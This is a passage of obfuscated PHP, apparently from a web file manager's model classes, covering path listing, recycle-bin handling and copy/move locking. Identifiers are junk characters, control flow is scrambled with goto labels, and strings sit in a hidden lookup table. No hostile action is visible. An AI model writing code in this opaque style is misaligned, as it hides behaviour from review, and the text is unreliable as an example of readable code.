array($CÚ‰Œ€˜ê•[411], $bë¡É∫◊Êƒ)); if (count($bë¡É∫◊Êƒ) == 1) { $Bç–ª·¥ ú = $this->sourceInfo($bë¡É∫◊Êƒ[0]); $Eƒ…ùÔéÜê = is_array($Bç–ª·¥ ú) ? array($Bç–ª·¥ ú) : !1; } else { $Eƒ…ùÔéÜê = $this->field($CÚ‰Œ€˜ê•[493])->where($A¨µ®©Ω’ò)->select(); } if (!$Eƒ…ùÔéÜê) { $Eƒ…ùÔéÜê = array(); } foreach ($Eƒ…ùÔéÜê as $fÙ¡‚†ÉÓ‚) { $F‘ª¶Ÿ˜º‘[$fÙ¡‚†ÉÓ‚[$CÚ‰Œ€˜ê•[395]]] = $fÙ¡‚†ÉÓ‚[$CÚ‰Œ€˜ê•[28]]; } } $Dá¡‘öò±ì = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Dı‚Ã∏ ﬂÆ; Dı‚Ã∏ ﬂÆ: $cﬂâ⁄À˜ß = array(); $B†íõ‡†–ä = array(); foreach ($bíÚæå•˘⁄ as &$CŸÛ ∏ôü©) { goto Aä¥îπÈ≠¶; fß‰Àÿâ”ú: if (intval($CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($CŸÛ ∏ôü©, $b«÷„ ∫àı, $Dá¡‘öò±ì); } goto c‚ÀäãÙúÒ; E îß£‚Æä: $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[495]] = str_replace($CÚ‰Œ€˜ê•[496], $CÚ‰Œ€˜ê•[8], $cè·«Ï‹ÇÖ); $eäñÊÈë‘® = trim($CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[495]], $CÚ‰Œ€˜ê•[8]); if ($CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[478]] == $CÚ‰Œ€˜ê•[191] && $eäñÊÈë‘®) { $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[28]] = $eäñÊÈë‘®; } goto fß‰Àÿâ”ú; Aä¥îπÈ≠¶: $BàÃ√ŸáŸ  = $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[487]]; if (isset($B†íõ‡†–ä[$BàÃ√ŸáŸ ])) { $cè·«Ï‹ÇÖ = $cﬂâ⁄À˜ß[$BàÃ√ŸáŸ ]; } else { $b«÷„ ∫àı = $this->parentLevelArray($CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[487]]); $CÊÀÃﬂŸ—® = $CÚ‰Œ€˜ê•[494] . $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[404]] . $CÚ‰Œ€˜ê•[440] . $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[484]]; if ($cﬂâ⁄À˜ß[$CÊÀÃﬂŸ—®]) { $cè·«Ï‹ÇÖ = $cﬂâ⁄À˜ß[$CÊÀÃﬂŸ—®]; } else { $cè·«Ï‹ÇÖ = $this->_listAppendPathRoot($CŸÛ ∏ôü©, $b«÷„ ∫àı); $cﬂâ⁄À˜ß[$CÊÀÃﬂŸ—®] = $cè·«Ï‹ÇÖ; } foreach ($b«÷„ ∫àı as $e¿—ë∫Â¢» => $dÑÀî·áÿò) { if ($e¿—ë∫Â¢» == 0 && $cè·«Ï‹ÇÖ && $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[404]] == self::TYPE_GROUP) { continue; } if (isset($F‘ª¶Ÿ˜º‘[$dÑÀî·áÿò])) { $cè·«Ï‹ÇÖ .= $F‘ª¶Ÿ˜º‘[$dÑÀî·áÿò] . $CÚ‰Œ€˜ê•[8]; } } if ($b«÷„ ∫àı) { $cè·«Ï‹ÇÖ .= $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[28]]; } $cﬂâ⁄À˜ß[$BàÃ√ŸáŸ ] = $cè·«Ï‹ÇÖ; } if ($CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[403]]) { $cè·«Ï‹ÇÖ .= $CÚ‰Œ€˜ê•[8]; } goto E îß£‚Æä; c‚ÀäãÙúÒ: } goto BÙ¥¥Èãõ’; eè∫⁄∂îÌ≠: $CÚ‰Œ€˜ê• =& $_SERVER[ú∫]; static $F‘ª¶Ÿ˜º‘ = array(); $bë¡É∫◊Êƒ = array(); goto C¶ûÙ¶Ì¡´; C¶ûÙ¶Ì¡´: $F•ÚÓ◊¥ﬂ“ = array(); foreach ($bíÚæå•˘⁄ as &$CŸÛ ∏ôü©) { $FÔÇÌâ≈≠‚ = $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[403]] == $CÚ‰Œ€˜ê•[87]; if ($FÔÇÌâ≈≠‚) { $F‘ª¶Ÿ˜º‘[$CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[395]]] = $CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[28]]; } if (isset($F•ÚÓ◊¥ﬂ“[$CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[487]]])) { continue; } $F•ÚÓ◊¥ﬂ“[$CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[487]]] = !0; $b«÷„ ∫àı = $this->parentLevelArray($CŸÛ ∏ôü©[$CÚ‰Œ€˜ê•[487]]); foreach ($b«÷„ ∫àı as $e¿—ë∫Â¢» => $dÑÀî·áÿò) { if ($e¿—ë∫Â¢» != 0 && !isset($F‘ª¶Ÿ˜º‘[$dÑÀî·áÿò])) { $bë¡É∫◊Êƒ[] = $dÑÀî·áÿò; } } } unset($CŸÛ ∏ôü©); goto c∏±»£çèî; DÁ∆ôñüı¡: } private function _listAppendPathRecycle(&$EÙÕ·ƒéá¢, $Dê¨›‰ò‘å, $AÒà°àáÕ¯) { goto fÏ‚µ“¨¯ç; fÏ‚µ“¨¯ç: $aá›«π’Çπ =& $_SERVER[ú∫]; if (!in_array($AÒà°àáÕ¯, $Dê¨›‰ò‘å) && $EÙÕ·ƒéá¢[$aá›«π’Çπ[395]] != $AÒà°àáÕ¯) { return; } $F”⁄¶õ¿Øí = explode($aá›«π’Çπ[8], trim($EÙÕ·ƒéá¢[$aá›«π’Çπ[495]], $aá›«π’Çπ[8])); goto AÇÊ˘ÃÔî£; D´€ï·∞á∑: if ($EÙÕ·ƒéá¢[$aá›«π’Çπ[395]] == $AÒà°àáÕ¯) { $EÙÕ·ƒéá¢[$aá›«π’Çπ[487]] = $aá›«π’Çπ[498]; $EÙÕ·ƒéá¢[$aá›«π’Çπ[478]] = $aá›«π’Çπ[191]; $EÙÕ·ƒéá¢[$aá›«π’Çπ[28]] = LNG($aá›«π’Çπ[497]); } $EÙÕ·ƒéá¢[$aá›«π’Çπ[499]] = $aá›«π’Çπ[500]; goto FøÁ´¶ÒÆ‰; AÇÊ˘ÃÔî£: $Aç±€»ﬁà‰ = implode($aá›«π’Çπ[8], array_slice($F”⁄¶õ¿Øí, 2)); $EÙÕ·ƒéá¢[$aá›«π’Çπ[495]] = $aá›«π’Çπ[8] . LNG($aá›«π’Çπ[497]) . $aá›«π’Çπ[8] . ltrim($Aç±€»ﬁà‰, $aá›«π’Çπ[8]); $EÙÕ·ƒéá¢[$aá›«π’Çπ[487]] = $aá›«π’Çπ[498] . implode($aá›«π’Çπ[47], array_slice($Dê¨›‰ò‘å, 1)) . $aá›«π’Çπ[47]; goto D´€ï·∞á∑; FøÁ´¶ÒÆ‰: } protected function _listAppendPathRoot(&$D¡ÂÛ€ÍÿÜ, $cç∏íæ‡è¶) { $eÖê£¯Ö◊ë =& $_SERVER[ú∫]; $bÛóÑëÙ˘Õ = $eÖê£¯Ö◊ë[33]; if ($D¡ÂÛ€ÍÿÜ[$eÖê£¯Ö◊ë[404]] == self::TYPE_USER) { if (defined($eÖê£¯Ö◊ë[454]) && $D¡ÂÛ€ÍÿÜ[$eÖê£¯Ö◊ë[484]] == USER_ID) { $bÛóÑëÙ˘Õ = LNG($eÖê£¯Ö◊ë[501]); if (!$cç∏íæ‡è¶) { $D¡ÂÛ€ÍÿÜ[$eÖê£¯Ö◊ë[28]] = $bÛóÑëÙ˘Õ; } } else { $c§Õç•ñüı = Model($eÖê£¯Ö◊ë[502])->getInfoSimple($D¡ÂÛ€ÍÿÜ[$eÖê£¯Ö◊ë[484]]); $bÛóÑëÙ˘Õ = LNG($eÖê£¯Ö◊ë[503]) . $eÖê£¯Ö◊ë[160] . $c§Õç•ñüı[$eÖê£¯Ö◊ë[28]] . $eÖê£¯Ö◊ë[504]; } } else { if ($D¡ÂÛ€ÍÿÜ[$eÖê£¯Ö◊ë[404]] == self::TYPE_GROUP) { $c§Õç•ñüı = Model($eÖê£¯Ö◊ë[486])->getInfoSimple($D¡ÂÛ€ÍÿÜ[$eÖê£¯Ö◊ë[484]]); $bÛóÑëÙ˘Õ = $c§Õç•ñüı[$eÖê£¯Ö◊ë[28]]; } else { if ($D¡ÂÛ€ÍÿÜ[$eÖê£¯Ö◊ë[404]] == self::TYPE_SYSTEM) { $bÛóÑëÙ˘Õ = $eÖê£¯Ö◊ë[505]; } } } $bÛóÑëÙ˘Õ = $bÛóÑëÙ˘Õ ? $eÖê£¯Ö◊ë[8] . $bÛóÑëÙ˘Õ . $eÖê£¯Ö◊ë[8] : $eÖê£¯Ö◊ë[8]; return $bÛóÑëÙ˘Õ; } protected function _listAppendUser(&$aÒ¬ÎŸÂ§ó) { goto C—±¨øº‡„; C—±¨øº‡„: $a–§…ª⁄ãÀ =& $_SERVER[ú∫]; $Cñ…á°Û›É = array_to_keyvalue($aÒ¬ÎŸÂ§ó, $a–§…ª⁄ãÀ[33], $a–§…ª⁄ãÀ[432]); $FÚûóû¬¿î = array_to_keyvalue($aÒ¬ÎŸÂ§ó, $a–§…ª⁄ãÀ[33], $a–§…ª⁄ãÀ[434]); goto eçù«ùò∏¥; eçù«ùò∏¥: $Fò◊ßÁùàÖ = array_merge($Cñ…á°Û›É, $FÚûóû¬¿î); $F⁄€ÔÉú≈ê = Model($a–§…ª⁄ãÀ[506])->userListInfo($Fò◊ßÁùàÖ); foreach ($aÒ¬ÎŸÂ§ó as &$f·ë©¥¨Öß) { $B∑ÒÓ·∫Çƒ = $f·ë©¥¨Öß[$a–§…ª⁄ãÀ[432]]; $f·ë©¥¨Öß[$a–§…ª⁄ãÀ[432]] = $F⁄€ÔÉú≈ê[$B∑ÒÓ·∫Çƒ] ? $F⁄€ÔÉú≈ê[$B∑ÒÓ·∫Çƒ] : !1; $B∑ÒÓ·∫Çƒ = $f·ë©¥¨Öß[$a–§…ª⁄ãÀ[434]]; $f·ë©¥¨Öß[$a–§…ª⁄ãÀ[434]] = $F⁄€ÔÉú≈ê[$B∑ÒÓ·∫Çƒ] ? $F⁄€ÔÉú≈ê[$B∑ÒÓ·∫Çƒ] : !1; if (isset($f·ë©¥¨Öß[$a–§…ª⁄ãÀ[445]]) && $f·ë©¥¨Öß[$a–§…ª⁄ãÀ[445]][$a–§…ª⁄ãÀ[507]]) { $EÛ™’ÒÏÀ‚ = $GLOBALS[$a–§…ª⁄ãÀ[6]][$a–§…ª⁄ãÀ[88]][$a–§…ª⁄ãÀ[508]]; if ($f·ë©¥¨Öß[$a–§…ª⁄ãÀ[445]][$a–§…ª⁄ãÀ[509]] <= time() - $EÛ™’ÒÏÀ‚) { $this->metaSet($f·ë©¥¨Öß[$a–§…ª⁄ãÀ[395]], $a–§…ª⁄ãÀ[507], null); $this->metaSet($f·ë©¥¨Öß[$a–§…ª⁄ãÀ[395]], $a–§…ª⁄ãÀ[509], null); unset($f·ë©¥¨Öß[$a–§…ª⁄ãÀ[445]][$a–§…ª⁄ãÀ[507]]); continue; } $C±¬∫ˆƒÒï = $f·ë©¥¨Öß[$a–§…ª⁄ãÀ[445]][$a–§…ª⁄ãÀ[507]]; $f·ë©¥¨Öß[$a–§…ª⁄ãÀ[445]][$a–§…ª⁄ãÀ[510]] = Model($a–§…ª⁄ãÀ[506])->getInfoSimpleOuter($C±¬∫ˆƒÒï); } } goto Fﬂ◊ùÉ˘; Fﬂ◊ùÉ˘: unset($f·ë©¥¨Öß); goto Cá§™èıàè; Cá§™èıàè: } public function parentLevelArray($a¨àä√°ˆƒ) { $bßååÃáöØ =& $_SERVER[ú∫]; $a¨àä√°ˆƒ = explode($bßååÃáöØ[47], trim($a¨àä√°ˆƒ, $bßååÃáöØ[47])); return array_remove_value($a¨àä√°ˆƒ, $bßååÃáöØ[191]); } public function listAll($CéÔ´˜è·∑) { goto Eùä’ãË»Ü; Có·€¯é“ä: $dè«áÓ’¿› = array(); foreach ($c»â≥‹¶¨Â as $Bı¨≠éùõ§ => $cÆŸ™±çõÒ) { goto CñÙ…√⁄éå; bé´…Ü¡å¿: for ($c˜¢¢¡ÉÆ∫ = 0; $c˜¢¢¡ÉÆ∫ < count($F¯‘Ω∂≤®Á); $c˜¢¢¡ÉÆ∫++) { $Bõé¢¡Ç™¿ .= $c»â≥‹¶¨Â[$F¯‘Ω∂≤®Á[$c˜¢¢¡ÉÆ∫]][$fæ·ÚãÍ®ô[28]] . $fæ·ÚãÍ®ô[8]; } $Bõé¢¡Ç™¿ .= $cÆŸ™±çõÒ[$fæ·ÚãÍ®ô[28]]; if ($cÆŸ™±çõÒ[$fæ·ÚãÍ®ô[403]]) { $Bõé¢¡Ç™¿ .= $fæ·ÚãÍ®ô[8]; } goto A»æ⁄ò˜¶«; b«º†êÍÎ‰: if (!$cÆŸ™±çõÒ[$fæ·ÚãÍ®ô[403]]) { $D≠µÉæ„°ı[$fæ·ÚãÍ®ô[447]] = $cÆŸ™±çõÒ[$fæ·ÚãÍ®ô[447]]; $D≠µÉæ„°ı[$fæ·ÚãÍ®ô[86]] = $cÆŸ™±çõÒ[$fæ·ÚãÍ®ô[76]]; } $dè«áÓ’¿›[] = $D≠µÉæ„°ı; goto cà‰òﬁêº–; CñÙ…√⁄éå: $F¯‘Ω∂≤®Á = $this->parentLevelArray($cÆŸ™±çõÒ[$fæ·ÚãÍ®ô[487]]); array_shift($F¯‘Ω∂≤®Á); $Bõé¢¡Ç™¿ = $EÊ¿Ÿäê…â; goto bé´…Ü¡å¿; A»æ⁄ò˜¶«: $Bõé¢¡Ç™¿ = str_replace($fæ·ÚãÍ®ô[496], $fæ·ÚãÍ®ô[8], $Bõé¢¡Ç™¿); $Bõé¢¡Ç™¿ = str_replace($fæ·ÚãÍ®ô[496], $fæ·ÚãÍ®ô[8], $Bõé¢¡Ç™¿); $D≠µÉæ„°ı = array($fæ·ÚãÍ®ô[414] => str_replace($fæ·ÚãÍ®ô[496], $fæ·ÚãÍ®ô[8], $Bõé¢¡Ç™¿), $fæ·ÚãÍ®ô[517] => intval($cÆŸ™±çõÒ[$fæ·ÚãÍ®ô[403]]), $fæ·ÚãÍ®ô[85] => $this->pathInfoFilter($cÆŸ™±çõÒ)); goto b«º†êÍÎ‰; cà‰òﬁêº–: } return $dè«áÓ’¿›; goto eºûÇÖ”µ; Eﬁªèœçç´: $c»â≥‹¶¨Â = array_to_keyvalue($c»â≥‹¶¨Â, $fæ·ÚãÍ®ô[395]); $EÊ¿Ÿäê…â = "\57{$A∑êîîÆøÎ[$fæ·ÚãÍ®ô[28]]}\57"; $EÊ¿Ÿäê…â = $EÊ¿Ÿäê…â == $fæ·ÚãÍ®ô[496] ? $fæ·ÚãÍ®ô[8] : $EÊ¿Ÿäê…â; goto Có·€¯é“ä; Eùä’ãË»Ü: $fæ·ÚãÍ®ô =& $_SERVER[ú∫]; $A∑êîîÆøÎ = $this->sourceInfo($CéÔ´˜è·∑); $dü¿Ê”Ù÷ó = array($fæ·ÚãÍ®ô[511] => array($fæ·ÚãÍ®ô[512], $A∑êîîÆøÎ[$fæ·ÚãÍ®ô[487]] . $CéÔ´˜è·∑ . $fæ·ÚãÍ®ô[513]), $fæ·ÚãÍ®ô[514] => 0); goto cﬂ∫›ç∆Ëﬂ; cﬂ∫›ç∆Ëﬂ: $EæÇòù˘†◊ = $fæ·ÚãÍ®ô[515]; $c÷•ÿ•Èô™ = "\x4c\105\x46\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\x66\151\x6c\145\x20\x66\x69\154\145\40\157\x6e\40\163\x6f\165\x72\143\145\x2e\x66\151\x6c\x65\111\104\x20\x3d\40\146\x69\x6c\145\56\x66\151\154\x65\x49\x44"; $c»â≥‹¶¨Â = $this->alias($fæ·ÚãÍ®ô[516])->field($EæÇòù˘†◊)->where($dü¿Ê”Ù÷ó)->join($c÷•ÿ•Èô™)->select(); goto Eª…Ì–Œ•÷; Eª…Ì–Œ•÷: $this->_listAppendAuth($c»â≥‹¶¨Â); $this->_listAppendUser($c»â≥‹¶¨Â); $this->_listAppendPath($c»â≥‹¶¨Â); goto Eﬁªèœçç´; eºûÇÖ”µ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($BÈπëîﬂÜü) { goto d˘õÏ™Ÿ˘Ì; cÖ◊˜åﬂíÖ: $c∞„¶ÃËáÜ = 1; $this->_lockEvent($BÈπëîﬂÜü, array($Añ¡ﬂ•≠÷£[519], $Añ¡ﬂ•≠÷£[520]), $c∞„¶ÃËáÜ); $this->_lockParent($BÈπëîﬂÜü, array($Añ¡ﬂ•≠÷£[520]), $c∞„¶ÃËáÜ); goto eîâÀ¥˜£“; d˘õÏ™Ÿ˘Ì: $Añ¡ﬂ•≠÷£ =& $_SERVER[ú∫]; if (!$this->allowLock()) { return; } $this->_lockCheck($Añ¡ﬂ•≠÷£[518], $BÈπëîﬂÜü); goto cÖ◊˜åﬂíÖ; eîâÀ¥˜£“: $this->_lockEvent($BÈπëîﬂÜü, array($Añ¡ﬂ•≠÷£[521], $Añ¡ﬂ•≠÷£[522]), $c∞„¶ÃËáÜ); $this->_lockCheckEnd($Añ¡ﬂ•≠÷£[518], $BÈπëîﬂÜü); goto c∆∑˘‹Øô»; c∆∑˘‹Øô»: } public function lockCopyEnd($DàÙæÈóÖË) { $fÛÛä»åõÜ =& $_SERVER[ú∫]; if (!$this->allowLock()) { return; } $f¥Óì”Ω¨˘ = 0; $this->_lockEvent($DàÙæÈóÖË, array($fÛÛä»åõÜ[519], $fÛÛä»åõÜ[520]), $f¥Óì”Ω¨˘); $this->_lockParent($DàÙæÈóÖË, array($fÛÛä»åõÜ[520]), $f¥Óì”Ω¨˘); $this->_lockEvent($DàÙæÈóÖË, array($fÛÛä»åõÜ[521], $fÛÛä»åõÜ[522]), $f¥Óì”Ω¨˘); } public function lockWriteStart($D∑ïá≠°·ç, $CÁ˘®“Ù§ü = '') { goto CÜÊ„°«ë¨; CÜÊ„°«ë¨: $c•¬√ﬁ∑¢≤ =& $_SERVER[ú∫]; if (!$this->allowLock()) { return; } $this->_lockCheck($c•¬√ﬁ∑¢≤[519], $D∑ïá≠°·ç); goto Cîµ´àÆ≥¨; f£à°¨Ç€–: $this->_lockParent($D∑ïá≠°·ç, array($c•¬√ﬁ∑¢≤[518], $c•¬√ﬁ∑¢≤[520]), $b√ÈÁê”ªπ); $this->_lockCheckEnd($c•¬√ﬁ∑¢≤[519], $D∑ïá≠°·ç); goto F¨Ω≤´œπÉ; Cîµ´àÆ≥¨: $b√ÈÁê”ªπ = 1; $this->_lockKey($c•¬√ﬁ∑¢≤[523] . $D∑ïá≠°·ç . $c•¬√ﬁ∑¢≤[95] . $CÁ˘®“Ù§ü, $b√ÈÁê”ªπ); $this->_lockEvent($D∑ïá≠°·ç, array($c•¬√ﬁ∑¢≤[518], $c•¬√ﬁ∑¢≤[520]), $b√ÈÁê”ªπ); goto f£à°¨Ç€–; F¨Ω≤´œπÉ: } public function lockWriteEnd($D†µ´Ìä…Õ, $Fß∫´Ú´ﬁä = '') { $E∆Ùãáù≠Ã =& $_SERVER[ú∫]; if (!$this->allowLock()) { return; } $Bö ÊâòöŸ = 0; $this->_lockKey($E∆Ùãáù≠Ã[523] . $D†µ´Ìä…Õ . $E∆Ùãáù≠Ã[95] . $Fß∫´Ú´ﬁä, $Bö ÊâòöŸ); $this->_lockEvent($D†µ´Ìä…Õ, array($E∆Ùãáù≠Ã[518], $E∆Ùãáù≠Ã[520]), $Bö ÊâòöŸ); $this->_lockParent($D†µ´Ìä…Õ, array($E∆Ùãáù≠Ã[518], $E∆Ùãáù≠Ã[520]), $Bö ÊâòöŸ); } public function lockMoveStart($D†üƒ¡ÿ ä) { goto aÀÃ…ë§˜ä; c‹¿Ô˘·≥è: $EàÑÜ‘ˆ∂à = 1; $this->_lockKey($AÏèÜ©ó‹∏[524] . $D†üƒ¡ÿ ä, $EàÑÜ‘ˆ∂à); $this->_lockEvent($D†üƒ¡ÿ ä, array($AÏèÜ©ó‹∏[518], $AÏèÜ©ó‹∏[519]), $EàÑÜ‘ˆ∂à); goto FÁ®‘ùáÃª; FÁ®‘ùáÃª: $this->_lockParent($D†üƒ¡ÿ ä, array($AÏèÜ©ó‹∏[518], $AÏèÜ©ó‹∏[520]), $EàÑÜ‘ˆ∂à); $this->_lockEvent($D†üƒ¡ÿ ä, array($AÏèÜ©ó‹∏[525], $AÏèÜ©ó‹∏[521], $AÏèÜ©ó‹∏[522]), $EàÑÜ‘ˆ∂à); $this->_lockCheckEnd($AÏèÜ©ó‹∏[520], $D†üƒ¡ÿ ä); goto bî˜îÛ◊Ú; aÀÃ…ë§˜ä: $AÏèÜ©ó‹∏ =& $_SERVER[ú∫]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÏèÜ©ó‹∏[520], $D†üƒ¡ÿ ä); goto c‹¿Ô˘·≥è; bî˜îÛ◊Ú: } public function lockMoveEnd($b•∞ËÈΩ‹ö) { goto a€ì´ŸÃ≤Ö; a€ì´ŸÃ≤Ö: $bü†ë±Œˆã =& $_SERVER[ú∫]; if (!$this->allowLock()) { return; } $bÊ∫‘ßËáÒ = 0; goto Dê≈»ãûæ∑; Dê≈»ãûæ∑: $this->_lockKey($bü†ë±Œˆã[524] . $b•∞ËÈΩ‹ö, $bÊ∫‘ßËáÒ); $this->_lockEvent($b•∞ËÈΩ‹ö, array($bü†ë±Œˆã[518], $bü†ë±Œˆã[519]), $bÊ∫‘ßËáÒ); $this->_lockParent($b•∞ËÈΩ‹ö, array($bü†ë±Œˆã[518], $bü†ë±Œˆã[520]), $bÊ∫‘ßËáÒ); goto fã±ÚÓºê‹; fã±ÚÓºê‹: $this->_lockEvent($b•∞ËÈΩ‹ö, array($bü†ë±Œˆã[525], $bü†ë±Œˆã[521], $bü†ë±Œˆã[522]), $bÊ∫‘ßËáÒ); goto f÷µÎäå€Ò; f÷µÎäå€Ò: } private function _lockCheck($fÓÔ◊ı‰Òñ, $e€î™£ééé) { goto eã´Ã—¿≈¥; BΩÃ•ﬁêª: $bªä–Üåû‚ = array_reverse($this->parentLevelArray($Fßê®µ—ò‚[$aßà®Ö∫Í·[487]])); foreach ($bªä–Üåû‚ as $F∂õ∞›»√ƒ) { $eƒçÑáá∂Ñ = $fÓÔ◊ı‰Òñ . $aßà®Ö∫Í·[527] . $F∂õ∞›»√ƒ; if (CacheLock::lockGet($aßà®Ö∫Í·[528] . $eƒçÑáá∂Ñ)) { $Fßê®µ—ò‚ = $this->sourceInfo($F∂õ∞›»√ƒ); CacheLock::setErrorMsg($aßà®Ö∫Í·[160] . htmlspecialchars($Fßê®µ—ò‚[$aßà®Ö∫Í·[28]]) . $aßà®Ö∫Í·[504] . $aﬁ™€è¿óﬁ); $this->_lockKey($eƒçÑáá∂Ñ, 1); $this->_lockKey($eƒçÑáá∂Ñ, 0); } } goto EÑÂô◊Õì∏; eã´Ã—¿≈¥: $aßà®Ö∫Í· =& $_SERVER[ú∫]; $Fßê®µ—ò‚ = $this->sourceInfo($e€î™£ééé); $eƒçÑáá∂Ñ = $fÓÔ◊ı‰Òñ . $aßà®Ö∫Í·[95] . $e€î™£ééé; goto cÑ∏Ü¶ÙÑœ; cÑ∏Ü¶ÙÑœ: $this->_lockTimeStart[$eƒçÑáá∂Ñ] = timeFloat(); if (!is_array($Fßê®µ—ò‚)) { return; } $aﬁ™€è¿óﬁ = LNG($aßà®Ö∫Í·[526]); goto cõÑÌ¨˜ÿà; cõÑÌ¨˜ÿà: CacheLock::setErrorMsg($aßà®Ö∫Í·[160] . htmlspecialchars($Fßê®µ—ò‚[$aßà®Ö∫Í·[28]]) . $aßà®Ö∫Í·[504] . $aﬁ™€è¿óﬁ); $this->_lockKey($eƒçÑáá∂Ñ, 1); $this->_lockKey($eƒçÑáá∂Ñ, 0); goto BΩÃ•ﬁêª; EÑÂô◊Õì∏: } private function _lockCheckEnd($f√øı∑«à, $cãÏÌ˘√°º) { goto EÛ·˜ƒ¡”; aÜµ„™∫Ê‰: if (!isset($this->_lockTimeStart[$cõæ–ÔÙ¥∏])) { return; } $A™ËìÌäÁ‹ = timeFloat() - $this->_lockTimeStart[$cõæ–ÔÙ¥∏]; unset($this->_lockTimeStart[$cõæ–ÔÙ¥∏]); goto AìŒºøŸÉ¬; AìŒºøŸÉ¬: if ($A™ËìÌäÁ‹ > 0.5) { unset(self::$cacheSourceInfo[$dæå–ó⁄È≥[438] . $cãÏÌ˘√°º]); } $b÷‘‚Œïß† = $this->sourceInfo($cãÏÌ˘√°º); if (!$b÷‘‚Œïß†) { show_json(LNG($dæå–ó⁄È≥[105]), !1); } goto dÉÍå“…„ﬁ; EÛ·˜ƒ¡”: $dæå–ó⁄È≥ =& $_SERVER[ú∫]; $cõæ–ÔÙ¥∏ = $f√øı∑«à . $dæå–ó⁄È≥[95] . $cãÏÌ˘√°º; CacheLock::setErrorMsg($dæå–ó⁄È≥[375]); goto aÜµ„™∫Ê‰; dÉÍå“…„ﬁ: } private function _lockParent($f‹Æú®üÔ¥, $e˜ÛÍ÷œ»È, $Déì“ŸÂ”∞) { if (!$this->autoLockSet) { return; } $CÉµ®Ó«Üç = $this->sourceInfo($f‹Æú®üÔ¥); if (!is_array($CÉµ®Ó«Üç)) { return; } $aåñíï˜ê’ = array_reverse($this->parentLevelArray($CÉµ®Ó«Üç[$_SERVER[ú∫][487]])); foreach ($aåñíï˜ê’ as $C¿ªëÕÏäﬂ) { $this->_lockEvent($C¿ªëÕÏäﬂ, $e˜ÛÍ÷œ»È, $Déì“ŸÂ”∞); } } private function _lockEvent($F±‰åó°‘ÿ, $e∫™ÇØ¶…, $F¿•¬ÊÍ„í) { $f∆ˆüôúíŒ =& $_SERVER[ú∫]; if (!$this->autoLockSet) { return; } foreach ($e∫™ÇØ¶… as $f‘∑¿¬ó‰∑) { $aú”éº©”Í = $f‘∑¿¬ó‰∑ . $f∆ˆüôúíŒ[95] . $F±‰åó°‘ÿ; if ($F¿•¬ÊÍ„í && CacheLock::lockGet($f∆ˆüôúíŒ[528] . $aú”éº©”Í)) { continue; } $this->_lockKey($aú”éº©”Í, $F¿•¬ÊÍ„í); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($c◊´ó‚‘¨·, $Fﬂ·≠≈¢¯â = 1) { $AÚ⁄ƒ•ãÜ⁄ = $_SERVER[ú∫][528] . md5($c◊´ó‚‘¨·); if ($Fﬂ·≠≈¢¯â) { if (isset(self::$_lockItemArr[$AÚ⁄ƒ•ãÜ⁄])) { return; } self::$_lockItemArr[$AÚ⁄ƒ•ãÜ⁄] = 1; CacheLock::lock($AÚ⁄ƒ•ãÜ⁄, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$AÚ⁄ƒ•ãÜ⁄])) { return; } unset(self::$_lockItemArr[$AÚ⁄ƒ•ãÜ⁄]); CacheLock::unlock($AÚ⁄ƒ•ãÜ⁄); } } public function isParentOf($Bå˘˜µÑÎØ, $BàÑ˜»Ìâ£) { goto Aì’àÇéƒ™; B‚èøµÂ√´: $dÍ∏ÑåÆâ» = $F›–‹®†√‰[$bªúÈ¿Óüë[487]] . $F›–‹®†√‰[$bªúÈ¿Óüë[395]] . $bªúÈ¿Óüë[47]; $Fï…êººº¿ = $e±∞™”ä‘Ç[$bªúÈ¿Óüë[487]] . $e±∞™”ä‘Ç[$bªúÈ¿Óüë[395]] . $bªúÈ¿Óüë[47]; $eª÷Ñ©ëß˜ = strpos($Fï…êººº¿, $dÍ∏ÑåÆâ») === 0; goto d“‡ì§˘Ùÿ; d“‡ì§˘Ùÿ: return $eª÷Ñ©ëß˜; goto f≠îüØ÷§ì; Aì’àÇéƒ™: $bªúÈ¿Óüë =& $_SERVER[ú∫]; $F›–‹®†√‰ = $this->sourceInfo($Bå˘˜µÑÎØ); $e±∞™”ä‘Ç = $this->sourceInfo($BàÑ˜»Ìâ£); goto B‚èøµÂ√´; f≠îüØ÷§ì: } private $targetIsDelete = 0; public function copy($A˜îëëÚ‹ñ, $aÖ÷î≠Ñ”Ã, $CÁˆı·˘…œ = REPEAT_REPLACE, $Fœø äﬁÆ = '') { goto Eë–⁄Øä≥Ë; DÈÉ¥ º¬∆: if (!$AéÓÜ⁄üÉî || !$Aê™±∑êŸ◊ || $Aê™±∑êŸ◊[$Eªæä˘øˆò[403]] != $Eªæä˘øˆò[87]) { return !1; } if ($this->isParentOf($A˜îëëÚ‹ñ, $aÖ÷î≠Ñ”Ã)) { return !1; } $F¯≥©ñù¥Û = $Fœø äﬁÆ ? $Fœø äﬁÆ : $AéÓÜ⁄üÉî[$Eªæä˘øˆò[28]]; goto aÂ≠¬©õ£å; E¬‰åÈ›©é: $this->updateModifyTime($aÖ÷î≠Ñ”Ã); return $Fê£ØÀçÉç; goto b˜Õ‰≤èä«; Bªåãıì‹è: $this->_childrenListClear(); $this->lockCopyEnd($A˜îëëÚ‹ñ); $this->lockWriteEnd($aÖ÷î≠Ñ”Ã, $F¯≥©ñù¥Û); goto C∏◊⁄’í¢Œ; 